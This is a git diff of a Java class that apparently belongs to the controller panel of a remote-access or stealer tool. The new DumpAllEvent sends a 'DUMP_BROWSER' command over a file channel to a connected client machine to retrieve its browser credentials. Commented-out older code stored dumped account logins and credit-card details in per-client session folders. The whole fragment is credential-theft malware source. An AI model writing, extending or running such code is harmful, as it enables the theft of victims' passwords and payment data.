@@ -1,28 +1,34 @@
-package GUI.TableUtils.Credentials;
+package GUI.TableUtils.Credentials.Events;
 
-import Connections.ClientErrorHandler;
-import GUI.TableUtils.Credentials.Packets.AccountCredentials;
-import GUI.TableUtils.Credentials.Packets.CombinedCredentials;
-import GUI.TableUtils.Credentials.Packets.CreditCardCredentials;
-import Information.Action;
-import Information.Time;
+import Connections.BytesChannel;
+import Connections.Category;
+import GUI.TableUtils.Credentials.CredentialsManagerGUI;
+import Information.AbstractEvent;
+import org.json.JSONObject;
 
-import javax.swing.*;
 import java.io.IOException;
-import java.util.ArrayList;
 
-public class DumpAllSender implements Runnable {
+public class DumpAllEvent extends AbstractEvent<CredentialsManagerGUI> {
 
-    private final CredentialsManagerGUI credentialsManagerGUI;
 
-    public DumpAllSender(CredentialsManagerGUI credentialsManagerGUI) {
-        this.credentialsManagerGUI = credentialsManagerGUI;
+    public DumpAllEvent(CredentialsManagerGUI guiManager) {
+        super(guiManager);
     }
 
     @Override
     public void run() {
+        BytesChannel bytesChannel = getClient().createFileChannel(Category.BROWSER_CREDENTIALS);
+        JSONObject jsonObject = new JSONObject();
+        jsonObject.put("ACTION", "DUMP_BROWSER");
+        jsonObject.put("channel_id", bytesChannel.getId());
         try {
-            String nameOfSession = credentialsManagerGUI.getClientHandler().getSessionFolder() + "/" + "/Browser Credentials/" + new Time().getTime();
+            getClient().sendString(jsonObject.toString());
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+
+        /* try {
+           String nameOfSession = credentialsManagerGUI.getClientHandler().getSessionFolder() + "/" + "/Browser Credentials/" + new Time().getTime();
             CombinedCredentials combinedCredentials = credentialsManagerGUI.getStream().getCredentials(Action.DUMP_CREDENTIALS, nameOfSession);
             ArrayList<AccountCredentials> accountCredentials = (ArrayList<AccountCredentials>) combinedCredentials.accountCredentials();
             ArrayList<CreditCardCredentials> creditCardCredentials = (ArrayList<CreditCardCredentials>) combinedCredentials.creditCardCredentials();
@@ -39,9 +45,9 @@ public class DumpAllSender implements Runnable {
             });
 
         } catch (IOException e) {
-            new ClientErrorHandler("Unable to open message box, connection lost with client",
-                    credentialsManagerGUI.getCredentialsManagerDialog(),
-                    credentialsManagerGUI.getStream().getClientSocket());
-        }
+          //  new ClientErrorHandler("Unable to open message box, connection lost with client",
+            //credentialsManagerGUI.getCredentialsManagerDialog(),
+             //       credentialsManagerGUI.getStream().getClientSocket());
+        }*/
     }
 }
